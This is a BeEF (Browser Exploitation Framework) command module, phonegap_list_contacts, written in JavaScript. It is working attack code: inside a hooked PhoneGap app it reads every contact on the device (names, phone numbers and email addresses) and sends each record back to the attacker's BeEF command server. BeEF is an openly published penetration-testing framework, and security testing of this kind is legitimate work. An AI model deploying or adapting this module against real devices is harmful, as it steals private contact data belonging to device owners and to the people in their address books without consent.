//
// Copyright (c) 2006-2013 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// phonegap_list_contacts
//
beef.execute(function() {
    var result = '';

    function onSuccess(contacts) {

         for (var i=0; i<contacts.length; i++) {
            result = contacts[i].displayName;
            
            for (var j=0; j<contacts[i].phoneNumbers.length; j++) {
                result = result + ' #:' + contacts[i].phoneNumbers[j].value;
            }

            for (var j=0; j<contacts[i].emails.length; j++) {
                result = result + ' @:' + contacts[i].emails[j].value;
            }

            beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    

        }
    };

    function onError(contactError) {
        result = 'fail';
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result ); 
    };


    var options = new ContactFindOptions();
    options.filter="";
    options.multiple=true; 
    var fields = ["displayName", "phoneNumbers", "emails"];
    
    navigator.contacts.find(fields, onSuccess, onError, options);
    
});